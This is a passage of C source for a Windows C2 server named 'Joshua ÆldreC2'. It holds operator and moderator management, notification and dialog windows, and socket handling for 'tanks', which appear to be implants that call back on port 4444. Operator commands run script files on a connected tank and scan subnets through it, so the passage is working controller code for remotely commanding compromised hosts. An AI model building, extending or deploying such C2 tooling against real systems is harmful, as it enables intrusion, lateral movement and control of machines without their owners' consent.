        }
        /* Restack remaining notifications */
        {
            RECT sr;
            int  y, j;
            SystemParametersInfo(SPI_GETWORKAREA, 0, &sr, 0);
            y = sr.bottom - NOTIF_H - 4;
            for (j = 0; j < NOTIF_STACK; j++) {
                if (g_notif_slots[j].active && g_notif_slots[j].hwnd) {
                    SetWindowPos(g_notif_slots[j].hwnd, HWND_TOPMOST,
                                 sr.right - NOTIF_W - 8, y,
                                 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
                    y -= (NOTIF_H + 4);
                }
            }
        }
        return 0;
    }
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

static void show_notification(const char *title, const char *body)
{
    NotifData  *nd;
    NotifSlot  *slot = NULL;
    HWND        hw;
    RECT        sr;
    int         i, x, y;

    /* Find a free slot */
    for (i = 0; i < NOTIF_STACK; i++) {
        if (!g_notif_slots[i].active) { slot = &g_notif_slots[i]; break; }
    }
    if (!slot) return;   /* all slots full — drop silently */

    nd = (NotifData *)GlobalAlloc(GPTR, sizeof(NotifData));
    if (!nd) return;
    lstrcpyn(nd->title, title, sizeof(nd->title) - 1);
    lstrcpyn(nd->body,  body,  sizeof(nd->body)  - 1);

    SystemParametersInfo(SPI_GETWORKAREA, 0, &sr, 0);
    x = sr.right  - NOTIF_W - 8;
    y = sr.bottom - NOTIF_H * (g_notif_count + 1) - 4 * (g_notif_count + 1);

    hw = CreateWindowEx(
        WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
        WC_NOTIF, "",
        WS_POPUP | WS_BORDER,
        x, y, NOTIF_W, NOTIF_H,
        NULL, NULL, g_hinst, NULL);
    if (!hw) { GlobalFree((HGLOBAL)nd); return; }

    SetWindowLong(hw, GWL_USERDATA, (LONG)nd);
    slot->active = 1;
    slot->hwnd   = hw;
    g_notif_count++;

    SetWindowPos(hw, HWND_TOPMOST, x, y, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW | SWP_NOACTIVATE);
    UpdateWindow(hw);
    SetTimer(hw, 1, NOTIF_DURATION, NULL);
}

/* ================================================================
 * Startup config dialog
 * ================================================================ */
static HWND g_sc_dlg    = NULL;
static HWND g_sc_port   = NULL;
static HWND g_sc_key    = NULL;

static LRESULT CALLBACK StartupCfgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    (void)lp;
    switch (msg) {
    case WM_CREATE: {
        HFONT hf = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HWND  hw;
        int   y = 12;
        char  portbuf[16];

        hw = CreateWindow("STATIC", "Joshua  \xe6ldreC2  \x97  Startup",
                          WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8,y,320,18,hwnd,NULL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);

        y = 38;
        hw = CreateWindow("STATIC","Listen port:",
                          WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8,y+3,90,18,hwnd,NULL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        sprintf(portbuf, "%d", g_startup_port);
        g_sc_port = CreateWindow("EDIT", portbuf,
                          WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL|ES_NUMBER,
                          102,y,80,22,hwnd,(HMENU)IDC_SC_PORT,g_hinst,NULL);
        SendMessage(g_sc_port,WM_SETFONT,(WPARAM)hf,FALSE);

        y = 68;
        hw = CreateWindow("STATIC","Server key:",
                          WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8,y+3,90,18,hwnd,NULL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        g_sc_key = CreateWindow("EDIT", g_server_key,
                          WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL|ES_READONLY,
                          102,y,120,22,hwnd,(HMENU)IDC_SC_KEY,g_hinst,NULL);
        SendMessage(g_sc_key,WM_SETFONT,(WPARAM)(HFONT)GetStockObject(SYSTEM_FIXED_FONT),FALSE);
        hw = CreateWindow("BUTTON","Regenerate",
                          WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          228,y,100,22,hwnd,(HMENU)IDC_SC_REGEN,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);

        y = 104;
        hw = CreateWindow("BUTTON","Start",
                          WS_CHILD|WS_VISIBLE|BS_DEFPUSHBUTTON,
                          104,y,110,28,hwnd,(HMENU)IDC_SC_OK,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wp) == IDC_SC_REGEN) {
            gen_server_key();
            if (g_sc_key) SetWindowText(g_sc_key, g_server_key);
            return 0;
        }
        if (LOWORD(wp) == IDC_SC_OK) {
            char portbuf[16];
            int  p;
            GetWindowText(g_sc_port, portbuf, sizeof(portbuf));
            p = atoi(portbuf);
            if (p > 0 && p <= 65535) g_startup_port = p;
            DestroyWindow(hwnd);
            return 0;
        }
        return 0;
    case WM_CLOSE:
        DestroyWindow(hwnd); return 0;
    case WM_DESTROY:
        g_sc_dlg = NULL; g_sc_port = NULL; g_sc_key = NULL;
        return 0;
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

static void show_startup_config(void)
{
    RECT  sr;
    int   sw, sh, dw, dh;
    MSG   msg;

    g_sc_dlg = CreateWindowEx(WS_EX_DLGMODALFRAME, "JoshuaStartupCfg",
                    "Joshua  \xe6ldreC2  \x97  Startup Configuration",
                    WS_POPUP|WS_CAPTION|WS_SYSMENU,
                    0, 0, 350, 148, NULL, NULL, g_hinst, NULL);
    if (!g_sc_dlg) return;

    SystemParametersInfo(SPI_GETWORKAREA, 0, &sr, 0);
    sw = sr.right - sr.left;
    sh = sr.bottom - sr.top;
    {
        RECT dr;
        GetWindowRect(g_sc_dlg, &dr);
        dw = dr.right - dr.left;
        dh = dr.bottom - dr.top;
    }
    SetWindowPos(g_sc_dlg, HWND_TOP,
                 sr.left + (sw - dw) / 2,
                 sr.top  + (sh - dh) / 2,
                 0, 0, SWP_NOSIZE);
    ShowWindow(g_sc_dlg, SW_SHOW);

    while (g_sc_dlg) {
        if (!GetMessage(&msg, NULL, 0, 0)) break;
        /* Easter egg: £ (0xA3) during splash plays the NT4 startup theme */
        if (msg.message == WM_CHAR && msg.wParam == 0xA3)
            play_easter_egg();
        if (!IsDialogMessage(g_sc_dlg, &msg)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
    }
}

/* ================================================================
 * Server log helpers
 * ================================================================ */
static void log_append(const char *text)
{
    HWND out;
    int  len;
    log_write(text);   /* mirror everything to joshua.log */
    if (!g_console_sess || !g_console_sess->hwnd) return;
    out = GetDlgItem(g_console_sess->hwnd, IDC_OUT);
    if (!out) return;
    len = GetWindowTextLength(out);
    SendMessage(out, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessage(out, EM_REPLACESEL, 0, (LPARAM)text);
}

/* Send a line to an operator's socket (no TLS for ops in this version) */
static void op_send(JoshSession *s, const char *line)
{
    if (!s || s->sock == INVALID_SOCKET) return;
    send(s->sock, line, lstrlen(line), 0);
}

static void operator_broadcast(const char *text)
{
    int   i;
    char  line[ACCUM_SZ + 4];
    int   tlen = lstrlen(text);
    /* Ensure CRLF termination for the wire */
    strncpy(line, text, ACCUM_SZ - 2);
    line[ACCUM_SZ - 2] = '\0';
    /* Also echo to the local console session window */
    if (g_console_sess)
        session_append(g_console_sess, text);
    for (i = 0; i < MAX_SESSIONS; i++) {
        JoshSession *s = g_sess[i];
        if (!s || !s->is_op || !s->op_authed) continue;
        if (s->state != NS_CONNECTED)         continue;
        op_send(s, text);
        /* Also append to the operator's MDI child */
        session_append(s, text);
    }
    (void)tlen;
}

static int handle_is_unique(const char *handle)
{
    int i;
    for (i = 0; i < MAX_SESSIONS; i++) {
        JoshSession *s = g_sess[i];
        if (!s || !s->is_op || !s->op_authed) continue;
        if (lstrcmpi(s->op_handle, handle) == 0) return 0;
    }
    return 1;
}

static int count_mods(void)
{
    int i, n = 0;
    for (i = 0; i < MAX_SESSIONS; i++) {
        JoshSession *s = g_sess[i];
        if (s && s->is_op && s->op_authed && s->op_is_mod) n++;
    }
    return n;
}

/* Find an authed operator by handle (case-insensitive) */
static JoshSession *find_op(const char *handle)
{
    int i;
    for (i = 0; i < MAX_SESSIONS; i++) {
        JoshSession *s = g_sess[i];
        if (s && s->is_op && s->op_authed &&
            lstrcmpi(s->op_handle, handle) == 0) return s;
    }
    return NULL;
}

/* Process a /command from an operator (s != NULL) or console (s == NULL) */
static void run_op_command(JoshSession *caller, int is_console_cmd,
                           const char *line)
{
    char reply[256];

    if (strncmp(line, "/givemod ", 9) == 0) {
        const char   *target_h = line + 9;
        JoshSession  *t;
        if (!is_console_cmd && caller && !caller->op_is_mod) {
            op_send(caller, "ERR You are not a moderator\r\n");
            return;
        }
        t = find_op(target_h);
        if (!t) {
            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        if (t->op_is_mod) {
            sprintf(reply, "ERR %s is already a moderator\r\n", target_h);
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        t->op_is_mod = 1;
        session_set_title(t);
        sprintf(reply, "[MOD] %s given mod status by %s\r\n",
                t->op_handle,
                (is_console_cmd || !caller) ? "console" : caller->op_handle);
        operator_broadcast(reply);
        log_append(reply);

    } else if (strncmp(line, "/removemod ", 11) == 0) {
        const char  *target_h = line + 11;
        JoshSession *t;
        if (!is_console_cmd && caller && !caller->op_is_mod) {
            op_send(caller, "ERR You are not a moderator\r\n");
            return;
        }
        t = find_op(target_h);
        if (!t) {
            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        if (!t->op_is_mod) {
            sprintf(reply, "ERR %s is not a moderator\r\n", target_h);
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        if (count_mods() <= 1) {
            sprintf(reply, "ERR Cannot remove last moderator\r\n");
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        t->op_is_mod = 0;
        session_set_title(t);
        sprintf(reply, "[MOD] %s removed from mod by %s\r\n",
                t->op_handle,
                (is_console_cmd || !caller) ? "console" : caller->op_handle);
        operator_broadcast(reply);
        log_append(reply);

    } else if (strcmp(line, "/ops") == 0) {
        int   i;
        char  list[512];
        int   pos = 0;
        pos += sprintf(list + pos, "Operators:\r\n");
        for (i = 0; i < MAX_SESSIONS; i++) {
            JoshSession *s = g_sess[i];
            if (!s || !s->is_op || !s->op_authed) continue;
            pos += sprintf(list + pos, "  %s [%s] (%s)\r\n",
                           s->op_handle,
                           s->op_is_mod ? "mod" : "op",
                           s->is_op == IS_OP_LIGHTMAN ? "lightman" : "flynn");
            if (pos > 400) { strcat(list, "  ...\r\n"); break; }
        }
        if (caller) op_send(caller, list);
        else        log_append(list);

    } else if (strcmp(line, "/tanks") == 0) {
        int  i;
        char list[512];
        int  pos = 0;
        pos += sprintf(list + pos, "Tanks:\r\n");
        for (i = 0; i < MAX_SESSIONS; i++) {
            JoshSession *s = g_sess[i];
            if (!s || !s->is_tank) continue;
            pos += sprintf(list + pos, "  %s  OS: %s\r\n",
                           s->tank_host[0] ? s->tank_host : "?",
                           s->tank_os);
            if (pos > 400) { strcat(list, "  ...\r\n"); break; }
        }
        if (caller) op_send(caller, list);
        else        log_append(list);

    } else if (strncmp(line, "/kick ", 6) == 0) {
        const char  *target_h = line + 6;
        JoshSession *t;
        if (!is_console_cmd && caller && !caller->op_is_mod) {
            op_send(caller, "ERR You are not a moderator\r\n");
            return;
        }
        t = find_op(target_h);
        if (!t) {
            sprintf(reply, "ERR No such operator: %s\r\n", target_h);
            if (caller) op_send(caller, reply);
            else        log_append(reply);
            return;
        }
        sprintf(reply, "[OP] %s kicked by %s\r\n",
                t->op_handle,
                (is_console_cmd || !caller) ? "console" : caller->op_handle);
        op_send(t, "KICKED\r\n");
        session_close(t);
        operator_broadcast(reply);
        log_append(reply);

    } else if (strcmp(line, "/key") == 0 && is_console_cmd) {
        sprintf(reply, "Server key: %s\r\n", g_server_key);
        log_append(reply);

    } else if (strcmp(line, "/regenkey") == 0 && is_console_cmd) {
        char info[192];
        gen_server_key();
        sprintf(info,
                "Server key regenerated: %s\r\n"
                "Connect with:\r\n"
                "  lightman.exe <your-ip> %d %s\r\n"
                "  flynn.exe    <your-ip> %d %s\r\n",
                g_server_key,
                4444, g_server_key,
                4444, g_server_key);
        log_append(info);

    } else if (strncmp(line, "/emote ", 7) == 0) {
        /* IRC-style /me — broadcast as "* Handle text" in italics marker */
        const char *text = line + 7;
        char emote[ACCUM_SZ + 80];
        const char *who = (is_console_cmd || !caller)
                          ? "SERVER" : caller->op_handle;
        sprintf(emote, "* %s %s\r\n", who, text);
        operator_broadcast(emote);
        log_append(emote);

    } else if (strncmp(line, "/script ", 8) == 0) {
        /* /script <path>  — run a script file on the active tank     */
        const char *path = line + 8;
        int i; JoshSession *tank = NULL;
        for (i = 0; i < MAX_SESSIONS; i++) {
            if (g_sess[i] && g_sess[i]->is_tank &&
                g_sess[i]->state == NS_CONNECTED && !g_sess[i]->cmd_busy) {
                tank = g_sess[i]; break;
            }
        }
        if (!tank) {
            const char *err = "script: no idle connected tank found\r\n";
            if (caller) op_send(caller, err); else log_append(err);
        } else {
            int n = script_load(tank, path);
            if (n <= 0) {
                char err[MAX_PATH + 32];
                sprintf(err, "script: cannot load '%s'\r\n", path);
                if (caller) op_send(caller, err); else log_append(err);
            } else {
                char info[MAX_PATH + 64];
                sprintf(info, "[Script: %d commands from %s]\r\n", n, path);
                if (caller) op_send(caller, info);
                log_append(info);
                session_send_cmd(tank, tank->script_cmds[tank->script_idx++]);
            }
        }

    } else if (strncmp(line, "/scansubnet ", 12) == 0) {
        /* /scansubnet <cidr> [-p ports] — run scan on active tank    */
        const char *scan_args = line + 12;
        int   i;
        JoshSession *tank = NULL;
        /* Find the active MDI child's session if it's a tank         */
        for (i = 0; i < MAX_SESSIONS; i++) {
            if (g_sess[i] && g_sess[i]->is_tank &&
                g_sess[i]->state == NS_CONNECTED && !g_sess[i]->cmd_busy) {
                tank = g_sess[i]; break;
            }
        }
        if (!tank) {
            const char *err = "scansubnet: no idle connected tank found\r\n";
            if (caller) op_send(caller, err); else log_append(err);
        } else {
            char tmpdir[MAX_PATH], cmd[512], info[128];
            /* Open a temp TSV file for this scan                     */
            GetTempPath(MAX_PATH, tmpdir);
            if (!tmpdir[0]) lstrcpy(tmpdir, "C:\\TEMP\\");
            sprintf(tank->scan_tsv_path, "%sscan_%lu.tsv", tmpdir,
                    (unsigned long)GetTickCount());
            tank->scan_tsv = CreateFile(tank->scan_tsv_path, GENERIC_WRITE, 0,
                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (tank->scan_tsv == INVALID_HANDLE_VALUE) {
                const char *err = "scansubnet: cannot create temp TSV file\r\n";
                if (caller) op_send(caller, err); else log_append(err);
            } else {
                tank->scan_active = 1;
                tank->cmd_busy    = 1;
                sprintf(cmd, "scan %s\r\n", scan_args);
                session_send_cmd(tank, cmd);
                sprintf(info, "[Scanning %s via tank %s]\r\n",
                        scan_args,
                        tank->tank_host[0] ? tank->tank_host : "?");
                if (caller) op_send(caller, info);
                log_append(info);
            }
        }

    } else if (strcmp(line, "/help") == 0 || strcmp(line, "/?") == 0) {
        const char *help =
            "Console commands:\r\n"
            "  /ops               List connected operators\r\n"
            "  /tanks             List connected tanks\r\n"
            "  /scansubnet <cidr> [-p ports]  Scan via active tank -> Dumont\r\n"
            "  /script <file>     Run a script file on the active tank\r\n"
            "  /givemod <handle>  Give operator moderator status\r\n"
            "  /removemod <h>     Remove moderator status\r\n"
            "  /kick <handle>     Disconnect an operator\r\n"
            "  /key               Display the current server key\r\n"
            "  /regenkey          Regenerate server key (console only)\r\n"
            "  /emote <text>      Action message  (* Handle text)\r\n"
            "  /help  /?          This help\r\n"
            "Plain text: broadcast as [SERVER] announcement to all operators.\r\n";
        if (caller) op_send(caller, help);
        else        log_append(help);

    } else {
        sprintf(reply, "ERR Unknown command: %s\r\n", line);
        if (caller) op_send(caller, reply);
        else        log_append(reply);
    }
}

static void operator_process_cmd(JoshSession *s, const char *line)
{
    run_op_command(s, 0, line);
}

static void local_console_cmd(const char *line)
{
    char echoed[ACCUM_SZ + 16];
    sprintf(echoed, "> %s\r\n", line);
    log_append(echoed);
    if (line[0] == '/') {
        run_op_command(NULL, 1, line);
    } else {
        /* Plain console text: broadcast as a server announcement */
        char ann[ACCUM_SZ + 32];
        sprintf(ann, "[SERVER] %s\r\n", line);
        operator_broadcast(ann);
        log_append(ann);
    }
}

/* ================================================================
 * Socket event handler
 * ================================================================ */
static void handle_socket_event(SOCKET sock, int event, int err)
{
    JoshSession *s = session_by_sock(sock);
    char buf[4096];
    int  n;
    char msg[80];

    if (!s) return;

    if (err) {
        sprintf(msg, "[error %d]\r\n", err);
        session_append(s, msg);
        session_close(s);
        return;
    }

    switch (event) {
    case FD_CONNECT:
        if (s->tls && g_tls_avail) {
            tls_client_begin(s);
        } else {
            s->state = NS_CONNECTED;
            session_set_title(s);
            session_append(s, "[connected]\r\n");
        }
        break;

    case FD_READ:
        n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;
        if (s->state == NS_TLS_SHAKE) {
            int room = NC_IBUF - s->tls_ibuf_len;
            if (n > room) n = room;
            memcpy(s->tls_ibuf + s->tls_ibuf_len, buf, n);
            s->tls_ibuf_len += n;
            tls_handshake_feed(s);
        } else if (s->state == NS_CONNECTED && s->tls) {
            tls_decrypt_recv(s, buf, n);   /* pkt_append called inside */
        } else if (s->state == NS_CONNECTED ||
                   s->state == NS_OP_AWAIT_HANDLE) {
            if (s->is_tank) pkt_append(s, PKT_IN, buf, n);
            session_process_data(s, buf, n);
        }
        break;

    case FD_ACCEPT: {
        struct sockaddr_in peer;
        int peer_len = sizeof(peer);
        SOCKET new_sock;
        memset(&peer, 0, sizeof(peer));
        new_sock = accept(s->listen_sock, (struct sockaddr *)&peer, &peer_len);
        if (new_sock == INVALID_SOCKET) break;
        WSAAsyncSelect(s->listen_sock, g_frame, 0, 0);
        closesocket(s->listen_sock);
        s->listen_sock = INVALID_SOCKET;
        s->sock        = new_sock;
        WSAAsyncSelect(s->sock, g_frame, WM_NC_SOCKET,
                       FD_READ | FD_WRITE | FD_CLOSE);
        s->state = NS_CONNECTED;
        session_set_title(s);
        sprintf(msg, "[connection from %s:%d]\r\n",
                inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        session_append(s, msg);
        /* Restart a sibling listener for the next callback */
        new_session("", s->port, 0, 1);
        break;
    }

    case FD_CLOSE:
        if (s->is_tank)
            session_append(s, "[Tank disconnected]\r\n");
        else if (s->is_op && s->op_authed) {
            char dinfo[128];
            sprintf(dinfo, "[%s disconnected]\r\n", s->op_handle);
            session_append(s, dinfo);
        } else
            session_append(s, "[connection closed]\r\n");
        session_close(s);
        break;
    }
}

/* ================================================================
 * Send commands to Tank
 * ================================================================ */
static void session_send_cmd(JoshSession *s, const char *cmd)
{
    char buf[MAX_PATH + 8];
    int  len;
    if (!s || s->state != NS_CONNECTED) return;
    strncpy(buf, cmd, sizeof(buf) - 3);
    buf[sizeof(buf)-3] = '\0';
    len = lstrlen(buf);
    buf[len]     = '\r';
    buf[len + 1] = '\n';
    buf[len + 2] = '\0';
    len += 2;

    pkt_append(s, PKT_OUT, buf, len);

    if (s->tls && g_tls_avail)
        tls_encrypt_send(s, buf, len);
    else
        send(s->sock, buf, len, 0);

    s->cmd_busy = 1;
    session_set_title(s);
    session_append(s, "> ");
    session_append(s, cmd);
    session_append(s, "\r\n");
}

static void session_send(JoshSession *s)
{
    HWND in_wnd;
    char buf[2048];
    int  len;
    if (!s) return;
    in_wnd = GetDlgItem(s->hwnd, IDC_IN);
    if (!in_wnd) return;
    len = GetWindowText(in_wnd, buf, (int)sizeof(buf) - 3);
    if (len <= 0) return;
    SetWindowText(in_wnd, "");
    if (s->is_console) {
        local_console_cmd(buf);
        return;
    }
    if (s->state != NS_CONNECTED) return;

    /* Pager active: Enter/Space = next page, q = quit */
    if (s->pager_active) {
        s->pager_active = 0;
        if (buf[0] == 'q' || buf[0] == 'Q')
            session_send_cmd(s, "QUITPAGE");
        else
            session_send_cmd(s, "NEXTPAGE");
        return;
    }

    if (s->macro_rec) macro_record_cmd(s, buf);
    session_send_cmd(s, buf);
}

/* ================================================================
 * Input-box dialog
 * ================================================================ */
static LRESULT CALLBACK InputBoxProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_CREATE: {
        HFONT hf = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HWND  hw;
        CREATESTRUCT *cs = (CREATESTRUCT *)lp;
        hw = CreateWindow("STATIC", (const char *)cs->lpCreateParams,
                          WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8, 10, 300, 18, hwnd, NULL, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        g_inp_edit = CreateWindow("EDIT", "",
                          WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
                          8, 32, 300, 22, hwnd, (HMENU)IDC_INPUT_EDIT, g_hinst, NULL);
        SendMessage(g_inp_edit, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("BUTTON", "OK",
                          WS_CHILD|WS_VISIBLE|BS_DEFPUSHBUTTON,
                          56, 62, 80, 26, hwnd, (HMENU)IDC_INPUT_OK, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        hw = CreateWindow("BUTTON", "Cancel",
                          WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          148, 62, 80, 26, hwnd, (HMENU)IDC_INPUT_CANCEL, g_hinst, NULL);
        SendMessage(hw, WM_SETFONT, (WPARAM)hf, FALSE);
        SetFocus(g_inp_edit);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wp) == IDC_INPUT_CANCEL || LOWORD(wp) == IDCANCEL) {
            g_inp_ok = 0; DestroyWindow(hwnd); return 0;
        }
        if (LOWORD(wp) == IDC_INPUT_OK) {
            GetWindowText(g_inp_edit, g_inp_buf, sizeof(g_inp_buf));
            g_inp_ok = 1; DestroyWindow(hwnd); return 0;
        }
        return 0;
    case WM_CLOSE:
        g_inp_ok = 0; DestroyWindow(hwnd); return 0;
    case WM_DESTROY:
        g_inp_dlg = NULL; g_inp_edit = NULL; return 0;
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

static int show_input_box(const char *prompt, const char *title)
{
    RECT wr, dr; int dw, dh;
    MSG  msg;

    g_inp_ok = 0;
    g_inp_buf[0] = '\0';
    g_inp_dlg = CreateWindowEx(WS_EX_DLGMODALFRAME, "JoshuaInputBox", title,
                    WS_POPUP|WS_CAPTION|WS_SYSMENU,
                    0, 0, 330, 105, g_frame, NULL, g_hinst,
                    (LPVOID)prompt);
    if (!g_inp_dlg) return 0;
    GetWindowRect(g_frame, &wr);
    GetWindowRect(g_inp_dlg, &dr);
    dw = dr.right - dr.left; dh = dr.bottom - dr.top;
    SetWindowPos(g_inp_dlg, HWND_TOP,
                 wr.left + (wr.right-wr.left-dw)/2,
                 wr.top  + (wr.bottom-wr.top-dh)/2,
                 0, 0, SWP_NOSIZE);
    ShowWindow(g_inp_dlg, SW_SHOW);

    while (g_inp_dlg) {
        if (!GetMessage(&msg, NULL, 0, 0)) break;
        if (!IsDialogMessage(g_inp_dlg, &msg)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
    }
    return g_inp_ok;
}

/* ================================================================
 * New-connection dialog
 * ================================================================ */
static void dlg_update_listen(void)
{
    int listen = (g_dlg_listenchk &&
                  SendMessage(g_dlg_listenchk, BM_GETCHECK, 0, 0) == BST_CHECKED);
    if (g_dlg_hedit) EnableWindow(g_dlg_hedit, !listen);
    if (g_dlg_tlschk && !g_tls_avail) EnableWindow(g_dlg_tlschk, FALSE);
}

static LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_CREATE: {
        HFONT hf = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        HWND  hw;
        int   y = 10;

        hw = CreateWindow("STATIC","Host:",WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8,y+3,44,18,hwnd,NULL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        g_dlg_hedit = CreateWindow("EDIT","",
                          WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
                          56,y,276,22,hwnd,(HMENU)IDC_DLG_HOST,g_hinst,NULL);
        SendMessage(g_dlg_hedit,WM_SETFONT,(WPARAM)hf,FALSE);

        y=40;
        hw = CreateWindow("STATIC","Port:",WS_CHILD|WS_VISIBLE|SS_LEFT,
                          8,y+3,44,18,hwnd,NULL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        g_dlg_pedit = CreateWindow("EDIT","4444",
                          WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL|ES_NUMBER,
                          56,y,60,22,hwnd,(HMENU)IDC_DLG_PORT,g_hinst,NULL);
        SendMessage(g_dlg_pedit,WM_SETFONT,(WPARAM)hf,FALSE);

        g_dlg_tlschk = CreateWindow("BUTTON","TLS",
                          WS_CHILD|WS_VISIBLE|BS_AUTOCHECKBOX,
                          130,y+2,60,18,hwnd,(HMENU)IDC_DLG_TLS,g_hinst,NULL);
        SendMessage(g_dlg_tlschk,WM_SETFONT,(WPARAM)hf,FALSE);

        g_dlg_listenchk = CreateWindow("BUTTON","Listen for Tanks",
                          WS_CHILD|WS_VISIBLE|BS_AUTOCHECKBOX,
                          200,y+2,140,18,hwnd,(HMENU)IDC_DLG_LISTEN,g_hinst,NULL);
        SendMessage(g_dlg_listenchk,WM_SETFONT,(WPARAM)hf,FALSE);
        SendMessage(g_dlg_listenchk, BM_SETCHECK, BST_CHECKED, 0);

        y=76;
        hw=CreateWindow("BUTTON","OK",WS_CHILD|WS_VISIBLE|BS_DEFPUSHBUTTON,
                          56,y,90,26,hwnd,(HMENU)IDC_DLG_OK,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        hw=CreateWindow("BUTTON","Cancel",WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,
                          158,y,90,26,hwnd,(HMENU)IDC_DLG_CANCEL,g_hinst,NULL);
        SendMessage(hw,WM_SETFONT,(WPARAM)hf,FALSE);
        dlg_update_listen();
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wp)==IDC_DLG_LISTEN) { dlg_update_listen(); return 0; }
        if (LOWORD(wp)==IDC_DLG_CANCEL||LOWORD(wp)==IDCANCEL) {
            g_dlg_ok=0; DestroyWindow(hwnd); return 0;
        }
        if (LOWORD(wp)==IDC_DLG_OK) {
            GetWindowText(g_dlg_hedit, g_dlg_host_buf, sizeof(g_dlg_host_buf));
            GetWindowText(g_dlg_pedit, g_dlg_port_buf, sizeof(g_dlg_port_buf));
            g_dlg_tls_val    = (SendMessage(g_dlg_tlschk,    BM_GETCHECK,0,0)==BST_CHECKED);
            g_dlg_listen_val = (SendMessage(g_dlg_listenchk, BM_GETCHECK,0,0)==BST_CHECKED);
            g_dlg_ok=1; DestroyWindow(hwnd); return 0;
        }
        return 0;
    case WM_CLOSE:
        g_dlg_ok=0; DestroyWindow(hwnd); return 0;
    case WM_DESTROY:
        g_dlg=NULL; g_dlg_hedit=NULL; g_dlg_pedit=NULL;
        g_dlg_tlschk=NULL; g_dlg_listenchk=NULL; return 0;
    }
    return DefWindowProc(hwnd, msg, wp, lp);
}

static int show_new_conn_dialog(void)
{
    RECT wr, dr; int dw, dh;
    MSG  msg;

    g_dlg_ok = 0;
    g_dlg_host_buf[0] = '\0';
    strcpy(g_dlg_port_buf, "4444");
    g_dlg_tls_val    = 0;
    g_dlg_listen_val = 1;

    g_dlg = CreateWindowEx(WS_EX_DLGMODALFRAME, "JoshuaDlg", "Tank Session",
                WS_POPUP|WS_CAPTION|WS_SYSMENU,
                0,0,350,120, g_frame,NULL,g_hinst,NULL);
    if (!g_dlg) return 0;
    GetWindowRect(g_frame, &wr); GetWindowRect(g_dlg, &dr);
    dw=dr.right-dr.left; dh=dr.bottom-dr.top;
    SetWindowPos(g_dlg, HWND_TOP,
                 wr.left+(wr.right-wr.left-dw)/2,
                 wr.top +(wr.bottom-wr.top-dh)/2,
                 0,0,SWP_NOSIZE);
    ShowWindow(g_dlg, SW_SHOW);
    SetFocus(g_dlg_hedit);

    while (g_dlg) {
        if (!GetMessage(&msg,NULL,0,0)) break;
        if (!IsDialogMessage(g_dlg, &msg)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
    }
    return g_dlg_ok;
}

/* ================================================================
 * Create session (connect-out or listen)
 * ================================================================ */
static void new_session(const char *host, int port, int tls_flag, int listen_mode)
{
    JoshSession    *s;
    MDICREATESTRUCT mcs;
    int             i;

    if (g_nsess >= MAX_SESSIONS) {
        MessageBox(g_frame,"Too many sessions.","Joshua",MB_OK|MB_ICONWARNING);
        return;
    }
    s = (JoshSession *)calloc(1, sizeof(JoshSession));
    if (!s) return;
    s->sock            = INVALID_SOCKET;
    s->listen_sock     = INVALID_SOCKET;
    s->file_recv_hfile = INVALID_HANDLE_VALUE;
    s->scan_tsv        = INVALID_HANDLE_VALUE;
    s->pkt_hwnd        = NULL;
